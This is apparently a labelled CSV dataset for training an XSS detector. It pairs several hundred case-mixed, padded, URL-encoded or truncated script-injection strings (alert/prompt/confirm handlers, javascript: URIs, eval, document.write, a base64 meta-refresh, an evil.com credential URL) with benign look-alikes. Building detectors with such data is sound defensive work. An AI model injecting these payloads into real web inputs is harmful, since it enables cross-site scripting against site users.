payload,label
<ImG oNFocUs=VALIdaTE()>,0
<svg oNLOad=vAlidATE()>,0
<DIv onloaD=PROmPT(1)>,1
rrEP<script>window</script>ULBx,1
<img onfocus=ale,1
<ScriPt>DOCuMENt.wrItE('<iMg SrC=X ONeRRoR=aleRt(1)>')</sCriPt>,1
<span OnMOusEOVEr=HighliGHT()>,0
<SVG Onfocus=INIt()>,0
jAVascRIPt:coNfiRM(1),1
<SPan OnfOCus=shOWMeNu()>,0
<diV OnLOad=SHoWMenu()>,0
<svg onclick=prompt(,1
<ScriPT>evaL('aLerT(1)')</scripT>,1
JaVaSCriPt:pROmPT(1),1
<a onfocus=ini,0
"<ScriPT>settIMEoUt('aLerT(1)',1000)</ScRiPT>",1
<sVg OnlOad=iNIt()>,0
N9javascript:void(0)P9O1,0
<a ONfocUS=ShOWMeNU()>,0
jfVbv<div onmouseover=init()>kBPy,0
NDbJ<a onfocus=alert(1)>z3,1
<DIV ONFoCUs=hiGHLigHt()>,0
"QDlBX<script>setTimeout('alert(1)',1000)</script>hgTQ",1
h7Lgy<svg onfocus=confirm(1)>lt,1
<A ONfoCuS=hIGhliGHt()>,0
R978<a onfocus=validate()>bGI0,0
NAw<a onclick=confirm(1)>ObC,1
74<img onfocus=confirm(1)>ky0,1
<a oNcLIcK=cOnfiRM(1)>,1
JAVascRipt:COnFIRM(1),1
JaVasCrIPt:vOID(0),0
"<sCRipt>seTtIMEOuT('ALerT(1)',1000)</scrIPt>",1
G2JrK<img onfocus=prompt(1)>69,1
<sVG OnCLICK=Confirm(1)>,1
<SVg ONfoCUS=SHowmenU()>,0
<imG oNloAD=NOOp()>,0
JaVAsCRipt:aLErT(1),1
5T6<a onclick=confirm(1)>iBBQlN,1
JavascrIpT:ALERt(1),1
<a onload=validat,0
<img onFOcuS=HIGhLIGht()>,0
<SvG onClICk=shOwmeNU()>,0
mKG<svg onmouseover=alert(1)>ZW2gMN,1
jKV<svg onclick=confirm(1)>4Cr,1
<a onCLick=nOOp()>,0
v4Ux6<span onload=init()>mI6,0
RcidK<img onfocus=highlight()>kR0,0
<SVG oNcLICK=PROmpt(1)>,1
ERZ<span onfocus=confirm(1)>L4EGgt,1
<a onclick=show,0
CEI48r<svg onclick=prompt(1)>VK,1
<ImG oNMOuSEOVeR=Noop()>,0
JavasCrIpT:AlErT(1),1
<A ONmoUSeoVER=NoOP()>,0
<ScRiPT>WiNDOw</Script>,1
<A oNLoAD=nooP()>,0
<SvG oNmouseOver=vaLIdaTe()>,0
"VXHFe<meta http-equiv=""refresh"" content=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">FB9td1",1
JaVAsCrIpT:ALeRT(1),1
Tam7Q<div onclick=validate()>Dzt,0
<sPAn ONClick=HighLIGhT()>,0
<DiV onClIck=NoOp()>,0
<SvG OnmOuSeovEr=VaLIdATe()>,0
"uSoFl<script>setTimeout('alert(1)',1000)</script>eG9hZ",1
mvB<div onload=init()>gSG,0
<SCRIPT>dOCuMeNt.WRItE('<ImG src=X onerRor=aleRt(1)>')</SCRiPT>,1
<Svg OnFoCUS=sHOWMENu()>,0
"<sCriPT>setTiMeoUt('ALert(1)',1000)</scrIpT>",1
GmB7S<span onclick=alert(1)>VUFT,1
jAvAScriPT:vOID(0),0
<Svg ONFocus=pRoMPt(1)>,1
42H<span onfocus=highlight()>9Zn9,0
<A OnLOAd=sHoWmENU()>,0
<a oNclicK=sHoWMEnu()>,0
<Svg ONFOCuS=sHOwmenu()>,0
<div ONfOcus=ShowMEnU()>,0
<IMg oNLoAd=nOop()>,0
<a Onload=ShOWMEnu()>,0
oofa<svg onload=prompt(1)>LfDqS,1
&lt;span onload=init()&gt;,0
JAVascrIpt:void(0),0
<SCripT>doCumeNt.Write('<IMG sRc=X ONErROr=ALErt(1)>')</sCriPT>,1
<A oNloaD=iNIT()>,0
javasCRIpt:proMPt(1),1
<DIV ONfOcUS=cOnFirM(1)>,1
<span ONCliCK=aleRT(1)>,1
&lt;svg onmouseover=confirm(1)&gt;,1
<img onclick=noop,0
<A oNmOUSEoVER=HiGhlIGht()>,0
<dIV onmouSeoVEr=PRompt(1)>,1
"grOar6<script>setTimeout(function(){},1000)</script>YW",0
<svG ONfOcUs=nooP()>,0
0D<div onclick=alert(1)>whe1a,1
&lt;script&gt;alert(1)&lt;/script&gt;,1
jAVASCriPT:cONfIRm(1),1
7xSL<svg onfocus=noop()>0GAh59,0
JAvascrIPT:vOiD(0),0
<iMG onmOuseOvER=vaLiDAte()>,0
<imG onFOcUs=PROMpt(1)>,1
OSWBKnjavascript:void(0)HN7WS,0
C65uy<script>eval('alert(1)')</script>G41b69,1
<iMG OnmoUSeovEr=PrOmPT(1)>,1
<div onclick=proMpT(1)>,1
<svG OnLOaD=ValIDAtE()>,0
Vxjavascript:void(0)Nx,0
<SpAn onFOcUS=VALIdate()>,0
wux7xf<div onload=prompt(1)>GQ5,1
JAvASCriPt:AleRT(1),1
<IMg onMOUSEOver=INIt()>,0
<a ONLOad=prompT(1)>,1
<svG ONfOCUs=IniT()>,0
javaScRipT:VOiD(0),0
<SCRIPt>dOCUmENt.WRiTE('<IMg SRc=X oNErROr=ALerT(1)>')</sCrIPt>,1
JavasCriPT:prompt(1),1
<ScRiPt>wInDOw</SCrIPt>,1
<SVG ONmOuseoVEr=coNfiRM(1)>,1
<span onmouseover=confir,1
FKzAejavascript:confirm(1)m2Dk0,1
74<img onfocus=highlight()>KB,0
<div OnmousEover=alERT(1)>,1
S6j<span onmouseover=validate()>Rg,0
IZUjavascript:prompt(1)dCPIa,1
jAVascRIPt:pROmpt(1),1
<Div OnLoad=Init()>,0
<DIv OnLoAd=ALeRt(1)>,1
<imG oNlOAD=ALeRt(1)>,1
<img onmouseover=init(),0
<SPaN onlOaD=PROmpT(1)>,1
<Svg OnlOAd=cOnFIRM(1)>,1
<a ONfoCuS=InIT()>,0
<iMg oNFOCus=HiGHlIghT()>,0
oigeB<script>eval('alert(1)')</script>LY,1
JAvascRIPt:aLeRT(1),1
bsM<a onload=alert(1)>ZLjni8,1
K7P1zjavascript:prompt(1)5z0,1
<sCRiPt>EvAL('aLERT(1)')</scRipT>,1
<IMg OncLiCK=ShOwMenu()>,0
zvy2<script>document.write('<img src=x onerror=alert(1)>')</script>WRdrX,1
FKBv<img onclick=noop()>FVUEUw,0
<sCRIPt>DocUmENt.WRIte('<IMG SRC=x onErrOr=alErT(1)>')</SCRiPt>,1
5dkn<a onmouseover=highlight()>Ly,0
17fLt<span onmouseover=noop()>R32Z,0
<span onload=al,1
JaVAsCRIpT:Void(0),0
7ecE7<script>window</script>f0DNE,1
jaVaSCRIPt:VoiD(0),0
"<scRiPT>SETtImeout('alerT(1)',1000)</scrIpt>",1
<img OnclIcK=Noop()>,0
<SVG oNMouseOvER=INiT()>,0
<DIV oNlOad=vaLIdATe()>,0
<IMG ONMOuSEOveR=SHOWMEnu()>,0
<a oNMOusEoVEr=inIt()>,0
<DIV Onfocus=PROmPt(1)>,1
JAVAscriPt:pROMPt(1),1
uqFWjavascript:void(0)bP,0
btwOjavascript:void(0)8u,0
IiPNuC<svg onmouseover=prompt(1)>0705a,1
<embed src=data:image/svg+xml;base64,1
<svg onClICK=AleRT(1)>,1
<IMG oNloaD=SHowMEnu()>,0
YX<img onload=validate()>vm,0
2sx<a onmouseover=alert(1)>x2ECS,1
YOxuvv<script>window</script>DL,1
%3Ca%20onclick%3Dconfirm%281%29%3E,1
K4Eq<div onmouseover=showMenu()>HC6bxv,0
<SPAN ONcLicK=vALIDATE()>,0
<sVG onmOUSEOvER=ConFIrm(1)>,1
<SPAn ONMOusEoVER=VAlIDaTE()>,0
RJ8<svg onmouseover=alert(1)>i2U,1
WnZIjavascript:void(0)w5,0
<DiV ONmoUSeoVeR=pROmPT(1)>,1
<SpAn oNfOcuS=hIghLigHt()>,0
&lt;span onmouseover=validate()&gt;,0
51TX<a onmouseover=noop()>he,0
<SVG oNmoUSeOveR=HiGHLIght()>,0
<a oncLicK=conFiRm(1)>,1
KsNxE<svg onmouseover=validate()>k47yD6,0
<Img oNClICk=CONFiRm(1)>,1
<SPan oNCliCk=alERT(1)>,1
Xh<span onclick=validate()>5m7YGX,0
<ScRipT>eVal('AlErT(1)')</scriPT>,1
92CqBj<a onload=noop()>e6o,0
kYb2<img onclick=prompt(1)>47,1
edE<a onfocus=noop()>kaQku3,0
<a ONcliCK=shOWmeNU()>,0
<img onclick=showMen,0
<div ONfOcuS=HighLIGHT()>,0
JAvAscRipt:ALerT(1),1
<div oNclICk=coNFIRM(1)>,1
JAvasCriPt:vOId(0),0
<a onCliCk=promPT(1)>,1
<ScriPT>wIndOW</scrIpt>,1
<DiV oNfoCuS=Noop()>,0
<A ONMouSeoVER=PRoMpt(1)>,1
zxnx<a onmouseover=validate()>FeAKv,0
jaVasCriPt:vOiD(0),0
<SCrIPt>WiNdOw</SCRIPT>,1
<iMg onFoCus=cOnfIRm(1)>,1
<a OnFOcus=hIghlight()>,0
DDgo9Xjavascript:void(0)C00vjg,0
<Svg oNFOCUs=pROmPt(1)>,1
"<sCrIPT>seTTImEoUT('alErT(1)',1000)</sCrIPt>",1
jAVaSCRiPT:CONfiRm(1),1
<sCrIpt>eVAL('AlERt(1)')</ScrIPT>,1
<sCRiPT>WinDOw</ScrIpT>,1
<A oNclicK=PROmpT(1)>,1
<SvG onClICK=coNFIRm(1)>,1
<A ONfoCUs=hiGHLIGht()>,0
ns7HlL<div onload=init()>Rb,0
<SCript>WindOW</SCriPt>,1
JaVASCriPT:vOID(0),0
jAvAsCRipt:VoId(0),0
<iMG onCLICk=INIt()>,0
jaVascripT:aLeRt(1),1
HTTP://usER:pass@EVil.Com,1
<a OncLICk=conFirM(1)>,1
<A oNClIcK=inIt()>,0
Hj<div onload=confirm(1)>Ta9gc,1
hgfzYH<div onmouseover=showMenu()>bC,0
DGRi<img onmouseover=showMenu()>CJv,0
<img onload=init()>,0
RT<script>document.write('<img src=x onerror=alert(1)>')</script>EE,1
jAvAsCRIpT:ALert(1),1
V0hmv9<a onmouseover=highlight()>E9OA9,0
<DiV oNlOaD=cONFiRm(1)>,1
JaVAsCRIPT:VoId(0),0
<DIV oNMouseover=aLERT(1)>,1
42<span onclick=alert(1)>gi0ICv,1
<A oncLICK=higHLIght()>,0
<spAn onLoAD=CONFiRm(1)>,1
lhSjvjavascript:alert(1)nIa,1
<a Onfocus=shoWmEnU()>,0
<SVG OnlOad=HIghliGHt()>,0
6SYDih<a onfocus=noop()>58,0
JAVAScrIpT:VOId(0),0
<spAN OncLICk=hiGHLiGHt()>,0
Mix<img onmouseover=highlight()>u9,0
Hd<svg onclick=noop()>KIX0sI,0
jAvAscrIpt:aLERT(1),1
<A onClick=NOOp()>,0
<svg onmouseover=va,0
<DIV OnLoad=VaLiDate()>,0
JavAScRIPT:ALErT(1),1
JAVAsCRIpt:PrOmpt(1),1
<sCripT>DocuMENt.WriTe('<Img SRC=x ONeRRor=ALErT(1)>')</scriPt>,1
<DiV onFoCuS=COnfiRM(1)>,1
<SVG OnLoaD=prOmPT(1)>,1
%253Ca%2520onmouseover%253Dvalidate%2528%2529%253E,0
422H<img onfocus=alert(1)>Xat2L,1
<iMg ONFOcUS=sHowmeNu()>,0
JAVAScriPt:aLeRT(1),1
<dIV ONloAd=SHowmENU()>,0
jAvascRIPt:VoiD(0),0
<script>winDow</ScriPt>,1
<iframe src=javascript:a,1
<dIv onLOAd=shOWMenu()>,0
<iMG onLoaD=cOnfirM(1)>,1
cR28<span onload=confirm(1)>LGl,1
<diV oNfOCUS=valIdATe()>,0
Mlmiw<span onfocus=init()>ajR,0
<div onmouseover=s,0
IftF0javascript:void(0)mYds,0
JAVaScrIpT:VoId(0),0
LXnqh<span onclick=init()>R8IZ1S,0
5UVsl<img onclick=init()>PMnH0,0
jAVASCriPt:PrOmPt(1),1
7hqw<div onfocus=validate()>EQg6u,0
<dIV oNCLiCK=PrOMPT(1)>,1
JavaScRIpT:coNfIrm(1),1
<imG OnFOCus=HIgHLigHt()>,0
xX2lf<script>window</script>ec8T0B,1
<SpAN ONFoCUs=validaTe()>,0
%253Cscript%253EsetTimeout%2528function%2528%2529%257B%257D%252C1000%2529%253C/script%253E,0
<diV ONClick=prOmpt(1)>,1
<SPAn onFocUS=nOOP()>,0
uV8O1I<img onfocus=noop()>faTUQ,0
"<SCrIPT>SettIMEOuT('aleRt(1)',1000)</ScRIpT>",1
<ImG ONclIck=ShOWMenU()>,0
6CaWQ<img onload=validate()>kOIJ,0
jAvASCrIpt:prOmPT(1),1
<SpAN OnmOuSEOVer=HiGHlIGHt()>,0
<iMG onLOaD=sHoWMenu()>,0
<spAN oNlOad=prOMPT(1)>,1
g1Qpjavascript:prompt(1)K89Cpz,1
JAVAScrIpT:vOID(0),0
javascript%253Aalert%25281%2529,1
<SPan OnClick=SHoWmeNU()>,0
<img onfocus=init(),0
<DiV oNcliCk=sHowMenU()>,0
<iMG oNloAD=iniT()>,0
<DIV onMousEover=ALeRt(1)>,1
"wA<script>setTimeout('alert(1)',1000)</script>wdms",1
<Span oNMOUseOvER=NoOp()>,0
4QZP<svg onmouseover=alert(1)>Qr83,1
<Div onCLIck=VALIDaTE()>,0
<SVg onMOUSeOver=CoNfirM(1)>,1
<DIv ONLOAd=COnfIRm(1)>,1
uTHW<img onload=alert(1)>sHpNB,1
JAVascRIPt:COnfirM(1),1
BP<span onmouseover=highlight()>jhSD,0
JAVascrIpT:VoiD(0),0
%253Ca%2520onload%253Dvalidate%2528%2529%253E,0
<svg OnLoad=prOMpt(1)>,1
<A ONcLIcK=cONfirm(1)>,1
Lm8dT<svg onmouseover=confirm(1)>jmPY,1
<sVg OnMouseoVER=CoNfIRM(1)>,1
JaVAsCRipT:cOnfIrm(1),1
aS<div onclick=showMenu()>4k5,0
jAVAscRiPt:vOiD(0),0
5nAjavascript:void(0)v9Q6oY,0
ywxq5d<div onload=prompt(1)>bUnDje,1
<SpAn ONFoCuS=PrOMPt(1)>,1
<script>Window</sCRIpT>,1
<sCriPt>DOCuMenT.WRITE('<ImG SRC=x oNErROR=aLert(1)>')</ScRiPT>,1
<imG ONlOAD=noOp()>,0
<svg onload=high,0
jsjavascript:prompt(1)ai,1
<sCRiPT>dOCUmenT.WriTe('<IMG SRC=X OneRRoR=ALeRt(1)>')</ScRiPT>,1
Ge<a onload=alert(1)>ph,1
q8<span onfocus=validate()>0W,0
<SpAn oNMOUseOvEr=vALiDAte()>,0
<Div oNcLICk=proMpT(1)>,1
<scRIPt>EvaL('ALeRT(1)')</sCRIpT>,1
jAVAsCrIPt:ProMpt(1),1
<a OnFoCuS=PrOmpT(1)>,1
<spaN OnLOAd=nOOp()>,0
JavaScriPt:CONfIRM(1),1
<DiV ONmoUsEoVER=ShoWmeNU()>,0
<sPan ONLoad=HIGHLIgHT()>,0
<svg oNfOCUS=iNIt()>,0
<div OnMouseOVer=aLert(1)>,1
<span onload=val,0
GtcZQjavascript:void(0)k5XA,0
wl<span onfocus=highlight()>o2,0
<spAN ONclicK=VAlIdATe()>,0
JaVAsCriPT:VOId(0),0
wFHB<img onclick=prompt(1)>yAQS0c,1
<SPAn ONClicK=ValidATe()>,0
<scRIpt>EvAl('AlERt(1)')</ScRIpt>,1
<A OnCLIck=AlErT(1)>,1
<SPAn onLoad=PRoMpT(1)>,1
Nf<a onfocus=showMenu()>vujxg,0
aXfbjavascript:void(0)lE2h,0
JAVasCriPt:Prompt(1),1
<svg ONLOAd=INIT()>,0
of0jO<svg onclick=validate()>cQ,0
JAvAScript:PROMpt(1),1
<diV oNMoUSeover=pROmpT(1)>,1
vHdxh<img onmouseover=init()>Mr,0
XMgUA<script>document.write('<img src=x onerror=alert(1)>')</script>R53fR,1
<A ONfoCuS=nOop()>,0
<a onMOUSEover=alert(1)>,1
<IMG ONmousEoveR=inIt()>,0
<A ONfOCUs=prOMpT(1)>,1
<a ONFocuS=Noop()>,0
<script>window</,1
<SCriPT>WIndow</ScRIPt>,1
jaVasCRipt:voId(0),0
<a oNFOCus=prompT(1)>,1
jAVascriPT:aLeRT(1),1
<SVg oNfoCuS=PrOmPt(1)>,1
A6javascript:confirm(1)me,1
<img oNFocUs=ALErT(1)>,1
"<SCrIpt>SEttimeOut('aleRT(1)',1000)</scrIpT>",1
<DIV oNloAD=cOnfiRm(1)>,1
<DIv onmOuseoVer=aLerT(1)>,1
<sCripT>doCumENT.WrITe('<imG sRc=X Onerror=ALErT(1)>')</sCriPT>,1
oqN<img onclick=alert(1)>Ix,1
FJO8tjavascript:prompt(1)XG,1
jAVAsCrIPT:PRoMPt(1),1
pcjavascript:void(0)ykGk,0
<scriPT>wiNdOw</ScRipT>,1
<SVg oNMoUSEOvER=aLeRt(1)>,1
JAVascripT:promPt(1),1
W6Z3Md<span onclick=confirm(1)>tDxR,1
<img onload=v,0
"<scRiPT>setTiMeOut('AlErt(1)',1000)</SCripT>",1
JAVaSCriPt:proMPT(1),1
javascrIpT:coNfirM(1),1
<ScrIPt>EVAL('aLerT(1)')</scRIpt>,1
Dc5p<script>eval('alert(1)')</script>Kf,1
exH<svg onload=noop()>xXQvkK,0
<a ONFOcUs=pROMpT(1)>,1
JAvascRiPt:Prompt(1),1
snvm<div onclick=confirm(1)>NdZtG,1
jaVaSCRiPT:CoNfiRm(1),1
<imG ONFoCUS=validatE()>,0
<DIV ONMoUSEOVER=PROMpt(1)>,1
<Div ONLOAD=ShOWMENU()>,0
<sVG oNFoCUs=sHOwmeNu()>,0
1Z<script>document.write('<img src=x onerror=alert(1)>')</script>WMsQ,1
<div onload=noop(),0
"<sCrIpt>SETtIMEOUT('aLErT(1)',1000)</sCriPT>",1
"<SCRiPt>SettImEOUt('ALERt(1)',1000)</sCRiPt>",1
"<SCRiPT>SETtimEoUt('aleRT(1)',1000)</sCripT>",1
<iMG onfOcus=ConFIrm(1)>,1
<svg onmouseover=,1
y4<script>window</script>gtEEx,1
JaVAScRiPT:VoID(0),0
<span ONclIck=ALert(1)>,1
<DiV OnfocUs=HiGHliGHt()>,0
"<sCrIpT>SEtTIMEOUt('aleRT(1)',1000)</scRipt>",1
<a onFOcUS=sHOwMeNu()>,0
J1P1n<script>window</script>AEIa8,1
GeiNMjavascript:void(0)av1,0
<A onlOaD=SHoWmEnU()>,0
<A ONLoaD=ShoWmENU()>,0
HPVH<script>document.write('<img src=x onerror=alert(1)>')</script>n7,1
jAvAsCrIpt:VOid(0),0
<sCriPT>DOCUMENt.wRiTE('<IMg SrC=X oNerROR=alERt(1)>')</ScriPT>,1
VmFG<script>window</script>rHsM,1
JavasCrIPt:Void(0),0
<svG oNloAd=CoNfIRm(1)>,1
jAvAScrIPT:CoNfIRM(1),1
9UGgt<div onfocus=alert(1)>jWOvF,1
<DiV OnLOad=PRomPT(1)>,1
7g2CwC<span onmouseover=init()>wCys,0
<A OnCliCK=higHliGht()>,0
<ScriPt>EVAL('ALert(1)')</ScrIpT>,1
<img onclick=alert,1
javAscrIPt:Void(0),0
<img onfocu,0
<Svg onclIcK=ConfirM(1)>,1
<a oNFocus=pRompT(1)>,1
m3MM1<div onfocus=confirm(1)>Uqsl,1
<SvG oNLOAD=nOOP()>,0
<svg OnLOAd=cONFIRM(1)>,1
<SpAN onloaD=Init()>,0
hX<svg onload=prompt(1)>O6oRI,1
5FcFjavascript:prompt(1)b9NL,1
<svG OnfOCUs=CoNFirM(1)>,1
jAvAScripT:pROmpt(1),1
document.write%28%27%3Cscript%3Ealert%281%29%3C/script%3E%27%29,1
<DiV oncLIck=ALeRT(1)>,1
IphRjC<a onmouseover=prompt(1)>gOs,1
xaHjavascript:confirm(1)aQ,1
<A OnLoad=iNIt()>,0
"<sCripT>SetTImeOut('aleRT(1)',1000)</SCRIPT>",1
AoMH<div onclick=prompt(1)>yTjk,1
<a onload=highligh,0
<SpAN onlOaD=pRoMPt(1)>,1
QMH<img onclick=highlight()>HV3ip,0
<div onmouseove,0
mI4OUCjavascript:prompt(1)YIpk,1
IM<a onfocus=init()>xzq,0
hW<svg onclick=prompt(1)>jb,1
<ScRipt>evAl('aLErt(1)')</scrIPt>,1
<DiV onmOusEOvEr=conFirM(1)>,1
<svG OnClick=AlErT(1)>,1
oW3javascript:alert(1)T9,1
<SPan OnClIcK=vaLIDAte()>,0
<div onfocus=highlight(,0
<Img ONLOAD=prOmPt(1)>,1
L3L<svg onfocus=noop()>fAHEYr,0
"<scRIpt>SettimEOUT('AlerT(1)',1000)</scRIpt>",1
<iMG onmoUSEOvER=noop()>,0
qdV<span onclick=alert(1)>8zPW3,1
<Span OnclIck=Init()>,0
<DIV ONcliCk=confirm(1)>,1
%253Ca%2520onload%253Dalert%25281%2529%253E,1
<A OnmousEOvER=aLERt(1)>,1
<spAN ONFocuS=ShowmeNU()>,0
P6GUk<svg onfocus=showMenu()>kT2,0
JavASCRipT:ALeRT(1),1
<SPAn ONcliCk=alErT(1)>,1
<sCRIpT>evAL('AleRt(1)')</SCRipt>,1
<SPAN OnCLICk=VaLIDAtE()>,0
<A OnclIck=cONfirM(1)>,1
javascRipt:pRompt(1),1
<DIV ONClICK=pRompt(1)>,1
Zs7i<span onfocus=highlight()>ZGzG,0
<dIv onMOusEovEr=aLerT(1)>,1
<diV onFocuS=showmENu()>,0
<SVg ONMOuSEOvER=pRomPt(1)>,1
<dIV ONMouseoVeR=InIt()>,0
JAvaScRipt:VOid(0),0
<dIv onFOCUs=PromPT(1)>,1
<SVG oNClICK=shOWmenu()>,0
<DIv onfOCUs=PRomPT(1)>,1
tgR<img onclick=highlight()>qY3Br,0
<ScriPt>WInDow</sCRIpt>,1
<DiV onmOUSeOveR=PrOMpT(1)>,1
JavaScrIpT:vOiD(0),0
JavAscriPT:void(0),0
<sPAN ONClICK=HighLIght()>,0
<A OnLoAd=pROMpT(1)>,1
<scriPt>wiNdoW</sCRIpT>,1
hV3nv<script>eval('alert(1)')</script>sUmLvy,1
"<SCript>setTimEOUT('aLert(1)',1000)</ScrIpT>",1
JaVascripT:VOID(0),0
<sVg OnFoCuS=cOnFirM(1)>,1
ZnVg<div onmouseover=alert(1)>zyQ,1
<a oncliCk=Noop()>,0
0YPi<a onmouseover=prompt(1)>WHu,1
zrQCw8<div onclick=highlight()>FR,0
"gxboxK<script>setTimeout('alert(1)',1000)</script>4gg",1
89b<a onload=prompt(1)>S6,1
ZkK6uD<a onfocus=confirm(1)>rBP4,1
mZ2v<a onload=highlight()>UEuMym,0
<SPAN oNmoUSeoVer=INIT()>,0
<svg OnLOAd=VAliDate()>,0
<span oNfOcus=CoNFIrM(1)>,1
y9vkujavascript:void(0)Eb,0
rQqbjavascript:prompt(1)6j,1
"3J<script>setTimeout('alert(1)',1000)</script>Ox",1
rQejavascript:void(0)ziq,0
<spAn OnClICk=ConfIrM(1)>,1
GX<script>document.write('<img src=x onerror=alert(1)>')</script>FPftc,1
<sCriPT>DOcumEnT.WRiTe('<iMg sRc=X onerROr=ALErt(1)>')</scRIpT>,1
DFQxKm<svg onfocus=confirm(1)>GMg,1
<iMg oNMOuseOvEr=INIt()>,0
<dIv onmouseoVeR=higHlIgHt()>,0
<IMG oNfocus=aLERT(1)>,1
bd<script>document.write('<img src=x onerror=alert(1)>')</script>sA,1
<diV OnfOcUS=NOOP()>,0
<DIV oNlOAD=SHowMenU()>,0
<a OnmouseoVEr=VaLIDate()>,0
javAsCRiPT:VOID(0),0
D7HVnJ<img onload=prompt(1)>bwEGK,1
<ScRIPT>wINdow</ScRIPt>,1
<DIv oNmOuseOVer=NoOp()>,0
"<SCRIpT>SettImeOUT('ALert(1)',1000)</ScripT>",1
<div oNmouSeOveR=pROmPT(1)>,1
lPBNE<script>eval('alert(1)')</script>F6xX1,1
<div onload=highlig,0
e44zDv<span onmouseover=highlight()>8tMdG,0
<svg onclick=s,0
JavAsCriPT:cOnfiRm(1),1
C7uO<script>window</script>hq04,1
<SVg oNMoUSEOVEr=hiGHlIgHT()>,0
jAVaScrIpt:voId(0),0
<Span ONcLICk=InIT()>,0
CQY<script>window</script>Ob,1
<IMG OncliCk=sHOwmEnU()>,0
<a OnmOUseOvEr=nOOP()>,0
<div onfocus=alert(,1
<Svg oNMOUsEOveR=cOnFIrm(1)>,1
YYoW<img onfocus=confirm(1)>j50HX,1
<SCRiPt>EVal('alERT(1)')</SCRiPt>,1
BQaL<div onfocus=validate()>Zk,0
<a OncLick=init()>,0
<span OnclICk=NoOp()>,0
<spAn OnmoUseoVer=alerT(1)>,1
<SpAN OnfoCUs=alerT(1)>,1
jAVASCRIpT:cOnFIRm(1),1
shcjavascript:confirm(1)Ver,1
<svg oNMOUSeOVeR=HiGHliGhT()>,0
<iMg oNCLIcK=INit()>,0
<a ONMouSeoVer=NoOp()>,0
4gPv<a onmouseover=prompt(1)>BNwX,1
<imG OnLoAd=proMpt(1)>,1
jAvAsCRIPt:coNFIrm(1),1
gEr<a onfocus=prompt(1)>KbiCX,1
nRzDDn<a onclick=validate()>gO2,0
jAvaScRiPT:COnFIrM(1),1
Qyhh<a onfocus=noop()>za,0
<span onmoUseOVEr=prOMPT(1)>,1
javascript%3Aalert%281%29,1
<sPan oNcLiCk=noOP()>,0
jaVAsCRIpT:coNfIrM(1),1
kzju9<svg onclick=confirm(1)>vfp,1
hd<script>document.write('<img src=x onerror=alert(1)>')</script>x8QFUz,1
<scRIpT>window</SCrIpT>,1
<dIv ONmousEoVer=ShoWMENU()>,0
s2<a onclick=prompt(1)>VkurU,1
BxbB<a onload=prompt(1)>forMo,1
<A oNcLick=AlERt(1)>,1
<diV oNcLiCk=PRompT(1)>,1
"<script>SEtTIMEout('AleRt(1)',1000)</scriPT>",1
<sCRIPT>evAl('ALERT(1)')</ScRiPt>,1
<script>var x = 10;<,0
Rc38Ejavascript:confirm(1)qIRf,1
mL<script>eval('alert(1)')</script>caXioc,1
<span oNLOAD=HiGhLigHT()>,0
<a OnFOCUS=aLERT(1)>,1
vY<span onclick=alert(1)>7kJ,1
javascript%3Aconfirm%281%29,1
aMi5<div onfocus=showMenu()>YfkfW,0
Nyd9Gl<span onload=prompt(1)>TwLiY,1
<DiV OnMouseoVer=CoNfiRm(1)>,1
<SCRiPT>doCuMeNT.wrIte('<iMG src=x onERrOr=aLeRt(1)>')</sCRIpT>,1
<Img OnmOUSeoVer=Init()>,0
"<scRIpt>SEtTImeOUt('ALERt(1)',1000)</SCRIpT>",1
<img oNFOCUS=AleRT(1)>,1
<DIv OnMouSEoVEr=aLERt(1)>,1
<a oNLoAD=showmenu()>,0
<SvG oNCLick=nOOP()>,0
o5pJBT<script>window</script>hI73I,1
<diV oNLOaD=ALErt(1)>,1
<a OncLICK=ConfiRM(1)>,1
JAVasCrIPT:cOnFiRM(1),1
jAvAScRiPt:aLERt(1),1
<svG ONFocus=aleRt(1)>,1
<img onfocus=high,0
<Svg ONmOUSeoVeR=pRomPT(1)>,1
S13iqR<div onload=init()>e7bqI,0
"<ScRIPt>sETTiMeOUt('AlERt(1)',1000)</scRIpt>",1
jaVaSCrIPT:Void(0),0
U6cLII<svg onclick=alert(1)>jo,1
%3Cimg%20onload%3Dconfirm%281%29%3E,1
Higq<div onload=showMenu()>MUEtR1,0
<SpAN OnfOCUs=PROMPT(1)>,1
<dIv onCLiCk=confIrm(1)>,1
q3dlMO<span onfocus=confirm(1)>KaBGz,1
9eYlzy<script>window</script>4CyUbR,1
OUz<a onfocus=validate()>JEs,0
MJG<script>window</script>WDt,1
javAscRipT:AleRt(1),1
brc<a onload=prompt(1)>5wL,1
jaVAScript:pRoMpT(1),1
QQjavascript:alert(1)40pw,1
JavascripT:coNFIrM(1),1
<svG OnCLICk=NooP()>,0
<span OnCLIcK=SHOWmeNu()>,0
